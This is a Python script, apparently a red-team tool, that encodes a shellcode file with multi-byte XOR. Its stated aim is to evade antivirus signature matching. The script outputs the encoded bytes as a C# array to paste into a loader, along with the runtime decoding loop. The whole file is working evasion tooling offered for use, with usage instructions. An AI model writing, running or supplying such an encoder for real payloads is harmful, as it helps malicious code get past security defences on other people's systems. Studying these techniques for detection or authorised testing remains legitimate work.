#!/usr/bin/env python3
"""
Multi-Byte XOR Shellcode Encoder
=================================
Single-byte XOR (key 0xfa, etc.) is trivially defeated by pattern analysis
because the XOR key repeats every byte. If an AV knows the key, it can XOR
back instantly and match the shellcode signature.

Multi-byte XOR cycles through a longer key (e.g. 4 bytes: 0xDE 0xAD 0xBE 0xEF).
The key pattern only repeats every N bytes — harder to brute-force and harder
for pattern matchers to reverse without knowing the exact key.

USAGE:
  # Encode (output C# byte array)
  python3 multibyte-xor.py encode shell.bin DEADBEEF

  # Encode (output Python bytes for testing)
  python3 multibyte-xor.py encode shell.bin DEADBEEF --format py

  # Decode (verify round-trip)
  python3 multibyte-xor.py decode encoded.bin DEADBEEF

KEY FORMAT:
  Hex string without 0x prefix: DEADBEEF, AA11BB22, FA2D9C01, etc.
  Any length — 2, 4, 8, 16 bytes all work.
"""

import sys
import os
import binascii

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def to_csharp(data: bytes, var_name: str = "buf") -> str:
    hex_bytes = ", ".join(f"0x{b:02x}" for b in data)
    lines = []
    width = 16
    chunks = [data[i:i+width] for i in range(0, len(data), width)]
    lines.append(f"byte[] {var_name} = new byte[{len(data)}] {{")
    for chunk in chunks:
        lines.append("    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    lines.append("};")
    return "\n".join(lines)

def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)

    mode = sys.argv[1]
    filepath = sys.argv[2]
    key_hex = sys.argv[3]
    fmt = "cs"
    if "--format" in sys.argv:
        idx = sys.argv.index("--format")
        fmt = sys.argv[idx + 1]

    # Parse key
    try:
        key = bytes.fromhex(key_hex)
    except ValueError:
        print(f"Error: key '{key_hex}' is not valid hex")
        sys.exit(1)

    print(f"# Key: 0x{key_hex.upper()} ({len(key)} bytes)")
    print(f"# Mode: {mode}")

    with open(filepath, "rb") as f:
        data = f.read()

    result = xor_bytes(data, key)
    print(f"# Input:  {len(data)} bytes")
    print(f"# Output: {len(result)} bytes")
    print()

    if fmt == "cs":
        print("// Encoded shellcode (paste into C# loader):")
        print(to_csharp(result, "buf"))
        print()
        print(f"// C# decoder — XOR back at runtime:")
        print(f"// byte[] key = new byte[] {{ {', '.join(f'0x{b:02x}' for b in key)} }};")
        print(f"// for (int i = 0; i < buf.Length; i++) buf[i] ^= key[i % key.Length];")
    elif fmt == "py":
        print("# Encoded shellcode:")
        print(f"buf = bytes([{', '.join(hex(b) for b in result)}])")
        print(f"key = bytes([{', '.join(hex(b) for b in key)}])")
        print("decoded = bytes(buf[i] ^ key[i % len(key)] for i in range(len(buf)))")

if __name__ == "__main__":
    main()
